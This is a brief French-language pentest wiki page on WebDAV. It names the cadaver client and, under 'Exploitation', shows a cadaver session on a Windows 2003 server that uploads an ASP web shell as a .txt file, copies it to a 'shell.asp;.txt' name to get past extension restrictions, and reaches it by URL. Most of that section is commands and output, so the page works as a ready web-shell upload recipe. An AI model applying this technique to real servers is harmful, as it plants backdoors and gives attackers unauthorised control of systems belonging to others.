---
title: WebDAV
permalink: /WebDAV/
---

Outils
------

### cadaver

L'outil cadaver permet d'intéragir avec WebDAV:

``` bash
cadaver 192.168.31.229
```

Exploitation
------------

### Sous Windows 2003

Il est possible d'uploader un shell ASP et de bypasser les restrictions sur les extensions:

``` text
dav:/> put shell.asp shell.txt
Uploading shell.asp to `/shell.txt':
Progress: [=============================>] 100.0% of 38013 bytes succeeded.
dav:/> copy shell.txt shell.asp;.txt
Copying `/shell.txt' to `/shell.asp%3b.txt':  authentication failed.
```

Puis on accéde au shell via <http://192.168.31.229/shell.asp%3b.txt>.

Ressources
----------

-   [Article from Carnal0wnage](http://carnal0wnage.attackresearch.com/2010/05/more-with-metasploit-and-webdav.html)

[Catégorie:Technologies](/Catégorie:Technologies "wikilink")